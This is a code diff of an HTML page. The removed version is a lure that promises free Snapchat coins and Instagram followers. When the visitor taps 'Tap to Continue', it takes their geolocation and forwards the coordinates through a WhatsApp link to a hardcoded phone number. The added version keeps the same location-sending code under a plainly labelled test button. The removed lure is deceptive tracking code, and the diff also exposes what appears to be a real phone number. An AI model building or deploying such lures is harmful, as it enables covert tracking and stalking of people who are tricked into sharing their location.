@@ -1,47 +1,30 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Get Followers & Snap Coins</title>
-  <style>
-    body {
-      background-color: #1877f2;
-      color: #fff;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 50px;
-    }
-    button {
-      background-color: #fff;
-      color: #1877f2;
-      border: none;
-      padding: 15px 30px;
-      font-size: 18px;
-      border-ra0dius: 8px;
-      cursor: pointer;
-    }
-    #status {
-      margin-top: 20px;
-      font-size: 16px;
-      min-height: 20px;
-    }
-  </style>
-</head>
-<body>
-
-  <h1>Add Snap Coins & Insta Followers</h1>
-  <button onclick="getLocationAndSend()">Tap to Continue</button>
-  <p id="status"></p>
-
+  <title>Test WhatsApp Location</title>
   <script>
-    function sendToWhatsApp(lat, lng) {
-      const message = `User Location:\nLatitude: ${lat}\nLongitude: ${lng}\nhttps://www.google.com/maps?q=${lat},${lng}`;
-      const phone = "917989244794"; // Your WhatsApp number (with country code)
-      const url = `https://wa.me/${phone}?text=${encodeURIComponent(message)}`;
-      window.location.href = url;
-    }
+    function getLocation() {
+      if (!navigator.geolocation) {
+        alert("Geolocation not supported");
+        return;
+      }
 
-    function getLocationAndSend() {
-      const status = document.getElementById("status");
-      status.textContent =
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const lat = position.coords.latitude;
+          const lng = position.coords.longitude;
+          const phone = "917989244794";
+          const message = `Location: https://www.google.com/maps?q=${lat},${lng}`;
+          window.location.href = `https://wa.me/${phone}?text=${encodeURIComponent(message)}`;
+        },
+        (error) => {
+          alert("Location error: " + error.message);
+        }
+      );
+    }
+  </script>
+</head>
+<body style="text-align: center; margin-top: 50px;">
+  <button onclick="getLocation()" style="font-size: 20px; padding: 10px 20px;">Send Location via WhatsApp</button>
+</body>
+</html>
